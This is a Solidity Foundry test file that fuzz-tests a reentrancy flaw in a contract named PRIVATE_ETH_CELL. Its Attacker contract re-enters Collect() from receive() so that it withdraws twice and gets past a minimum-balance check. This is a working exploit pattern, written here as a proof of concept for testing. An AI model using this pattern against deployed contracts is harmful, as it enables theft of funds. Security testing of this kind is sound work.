
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract TestReentrancyPRIVATE_ETH_CELL is Test {
    
    PRIVATE_ETH_CELL public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PRIVATE_ETH_CELL();
        
        // Initialize dependencies but do not lock the contract yet (Initialized())
        // because we need to set MinSum in the test based on fuzz inputs.
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is large enough to be split and significant enough to test.
        // Limit to reasonable ETH amounts to avoid overflow issues in setup.
        vm.assume(attackVal >= 2 ether && attackVal < 100 ether);
        
        // Ensure attackVal is even for clean division in this specific exploit scenario
        attackVal = (attackVal / 2) * 2;

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerability relies on bypassing the MinSum check via reentrancy.
        // We set MinSum equal to the full deposit amount.
        // Normally, withdrawing half would leave the user below MinSum for a second withdrawal.
        // Reentrancy allows the second withdrawal before the balance updates.
        _contractUnderTest.SetMinSum(attackVal);
        _contractUnderTest.Initialized();

        // --- 3. Funding ---
        // Fund the test contract to pass value to the attacker
        vm.deal(address(this), attackVal * 2);
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PRIVATE_ETH_CELL public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public withdrawAmount;

    constructor(address victimAddress) { 
        victim = PRIVATE_ETH_CELL(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Calculate the amount to withdraw per call (half the deposit)
        withdrawAmount = val / 2;
        
        // Deposit the funds into the victim to establish the initial balance
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Call the vulnerable function
        // We withdraw half. Since Balance (val) >= MinSum (val), this is allowed.
        victim.Collect(withdrawAmount);

        // 4. Verify Success Conditions
        // If reentrancy worked, we should have withdrawn the full amount (2 * withdrawAmount)
        // despite the MinSum check that should have blocked the second withdrawal.
        if (address(this).balance >= val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // We re-enter once.
        // At this point, the victim's state (balance) has not been updated yet.
        // So Balance is still 'val', which is >= MinSum.
        if (attackCallCount < 1) {            
            attackCallCount++;
            victim.Collect(withdrawAmount);
        }
    }
}
